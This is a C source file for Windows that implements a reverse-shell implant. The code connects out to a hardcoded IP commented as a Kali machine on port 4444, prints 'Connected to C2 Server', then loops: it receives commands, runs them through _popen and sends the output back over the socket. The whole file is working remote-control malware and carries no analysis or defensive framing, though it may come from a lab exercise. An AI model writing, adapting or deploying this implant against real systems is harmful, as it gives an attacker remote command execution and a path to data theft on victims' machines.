#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

#define PORT 4444
#define BUFFER_SIZE 1024
#define SERVER_IP "192.168.0.120" // Kali's IP
#define TIMEOUT_SEC 10

#pragma comment(lib, "ws2_32.lib")

char* execute_command(const char *cmd) {
    static char buffer[BUFFER_SIZE];
    FILE *pipe;
    
    pipe = _popen(cmd, "r");
    
    if (!pipe) return "ERROR: Failed to open pipe\n";

    char temp[BUFFER_SIZE];
    size_t bytes_read = 0;
    
    while (fgets(temp, sizeof(temp), pipe) != NULL) {
        size_t len = strlen(temp);
        if (bytes_read + len < BUFFER_SIZE - 1) {
            strcpy(buffer + bytes_read, temp);
            bytes_read += len;
        }
    }

    _pclose(pipe);
    
    buffer[bytes_read] = '\0';
    return buffer;
}

int main() {
    WSADATA wsaData;
    SOCKET sockfd;
    struct sockaddr_in serv_addr;
    char buffer[BUFFER_SIZE]; // Fixed: was BBUFFER_SIZE
    int read_val;
    
    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("WSAStartup failed.\n");
        return 1;
    }

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == INVALID_SOCKET) {
        printf("Socket creation error: %d\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    // Set Socket Receive Timeout to 10 seconds
    DWORD timeout = TIMEOUT_SEC * 1000;
    setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);

    if (inet_pton(AF_INET, SERVER_IP, &serv_addr.sin_addr) <= 0) {
        printf("Invalid address / Address not found\n");
        closesocket(sockfd);
        WSACleanup();
        return 1;
    }

    if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        printf("Connection failed: %d\n", WSAGetLastError());
        closesocket(sockfd);
        WSACleanup();
        return 1;
    }

    printf("[*] Connected to C2 Server at %s:%d\n", SERVER_IP, PORT);

    while (1) {
        memset(buffer, 0, BUFFER_SIZE);
        
        // Receive command from server with timeout
        read_val = recv(sockfd, buffer, BUFFER_SIZE - 1, 0);
        
        if (read_val == SOCKET_ERROR) {
            int err = WSAGetLastError();
            if (err == WSAETIMEDOUT) {
                printf("\n[*] Timeout receiving command. Waiting...\n");
                continue; // Stay in loop, don't exit
            } else {
                printf("\n[*] Disconnected or error: %d\n", err);
                break;
            }
        }
        
        buffer[read_val] = '\0';

        // Remove trailing newline if present
        size_t len = strlen(buffer);
        if (len > 0 && buffer[len-1] == '\n') {
            buffer[len-1] = '\0';
        }

        // Execute command
        char *output = execute_command(buffer);
        
        // Send output back to server
        send(sockfd, output, strlen(output), 0);
    }

    closesocket(sockfd);
    WSACleanup();
    return 0;
}
